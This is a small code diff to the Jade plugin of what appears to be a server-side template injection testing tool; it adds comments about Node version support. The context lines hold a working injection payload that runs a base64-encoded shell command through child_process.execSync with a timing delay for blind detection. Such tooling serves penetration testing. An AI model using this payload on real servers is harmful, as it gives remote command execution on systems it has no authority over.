@@ -45,6 +45,8 @@ class Jade(Plugin):
         # Not using execute here since it's rendered and requires set headers and trailers
         'execute_blind' : {
             'call': 'inject',
+            # execSync() has been introduced in node 0.11, so this will not work with old node versions.
+            # TODO: use another function.
             'execute_blind': """\n- global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i')//"""
         },
         'execute' : {
